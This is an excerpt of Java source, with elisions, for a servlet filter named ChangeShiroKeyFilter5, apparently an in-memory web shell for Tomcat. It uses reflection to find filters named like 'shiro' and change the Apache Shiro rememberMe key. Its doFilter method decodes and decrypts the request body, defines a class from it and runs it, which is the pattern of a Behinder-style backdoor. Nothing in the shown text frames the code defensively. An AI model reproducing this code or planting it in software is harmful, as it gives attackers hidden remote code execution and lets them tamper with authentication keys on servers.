...
/**
 * 遍历 StandardContext.filterConfigs，对名称中包含 "shiro" 的项尝试修改 rememberMe 密钥（兼容非标准注册名）。
 */
public class ChangeShiroKeyFilter5 extends ClassLoader implements Filter {
    ...
    public ChangeShiroKeyFilter5(ClassLoader c) {
        super(c);
    }
    ...
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
        ...
        try {
            ...
            (new ChangeShiroKeyFilter5(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    private boolean tryApplyKey(Object filterConfigHolder) {
        try {
            Field field = filterConfigHolder.getClass().getDeclaredField("filter");
            field.setAccessible(true);
            Object obj = field.get(filterConfigHolder);
    ...
    public String addFilter() throws Exception {
        ...
        while (entries.hasNext()) {
            ...
            if (tryApplyKey(entry.getValue())) {
                return "change key ok (" + key + ")";
            }
        }
        return "no shiro-like filter in filterConfigs";
    }
